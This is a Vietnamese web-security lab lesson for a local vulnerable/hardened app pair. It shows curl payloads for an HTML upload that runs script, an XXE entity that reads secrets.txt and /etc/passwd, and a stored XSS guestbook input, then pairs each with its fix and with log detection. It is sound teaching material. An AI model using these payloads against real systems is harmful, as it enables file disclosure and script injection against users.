# Bài 13 · Upload + XXE + Stored XSS — khai thác phía nhận dữ liệu (LAB-13..15)

**Mục tiêu:** ba lỗ hổng đều nằm ở "đầu vào tệp/dữ liệu có cấu trúc" — upload
không kiểm soát, XML parser nhận external entity, và XSS **lưu trữ** (nguy hiểm
hơn reflected vì nạn nhân không cần click link).

## 1. Unrestricted Upload → stored XSS qua file

```bash
curl -s -X POST http://127.0.0.1:3000/upload \
  -d "name=poc.html&content=<script>alert(1)</script>"
curl -si http://127.0.0.1:3000/uploads/poc.html
# vuln → Content-Type: text/html → trình duyệt CHẠY script (file trong origin!)
```

Bản vuln còn nhận `multipart/form-data` (form `/upload` dùng được trong trình
duyệt). Trên app thật, file thực thi phía server (.php/.jsp) = webshell.

Đối chứng hardened (`:3001`): `.html` → `415`, chỉ whitelist
txt/md/csv/png/jpg/pdf; file hợp lệ được phục vụ `text/plain` — script không
chạy. Đây là "defense in depth": whitelist VÀ ép MIME.

## 2. XXE — XML external entity (mô phỏng an toàn)

Parser XML cũ cho phép định nghĩa entity trỏ tới file/URL — `<!ENTITY x SYSTEM
"file:///secrets.txt">`. Lab **mô phỏng** trên filesystem ảo (VFS trong RAM —
không đụng đĩa thật) nhưng ngữ nghĩa giống hệt parser thật:

```bash
curl -s -X POST http://127.0.0.1:3000/api/import -d '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///secrets.txt">]>
<i><item>&x;</item></i>'
# → items[0] chứa LAB_SECRET{...} — nội dung file nội bộ!
```

Thử `file:///etc/passwd` (lab có bản giả lập) — đúng như XXE thật trên Linux.
Đọc `file:///flag-xxe.txt` → **cờ CTF #7**.

Hardened trả `400 dtd_prohibited` — tắt DTD/entity là cách vá chuẩn (mọi thư
viện XML đều có cờ này). Thế hệ mới: dùng JSON thay XML.

## 3. Stored XSS — guestbook

```bash
curl -s -X POST http://127.0.0.1:3000/guestbook -d "msg=<svg/onload=alert(1)>"
curl -s http://127.0.0.1:3000/guestbook | grep svg    # payload NGUYÊN VĂN
```

Khác reflected XSS ở chỗ: payload **nằm sẵn trong DB**, tự chạy với mọi người
xem trang — comment/chat/review là nơi điển hình. Đối chứng hardened:
`esc()` khi render → hiển thị như văn bản vô hại.

## 4. Đọc log như blue-team

```bash
node src/cli.js detect http://127.0.0.1:3000
```

Ba hoạt động trên để lại dấu: `upload-abuse` (POST /upload), `xxe` (POST
/api/import), `xss` (payload trong log). **Tấn công luôn "to tiếng" trong log.**

## ✅ Hoàn thành khi

- [ ] Upload file `.html` chạy được script trên vuln; hardened trả 415
- [ ] XXE đọc được `secrets.txt` và `flag-xxe.txt` (nộp CTF #7)
- [ ] Stored XSS hiển thị raw trên vuln, escaped trên hardened
- [ ] Trả lời: vì sao "file nằm trong cùng origin" khiến upload-html nguy hiểm
      hơn file host ở domain khác? (gợi ý: cookie/SOP)
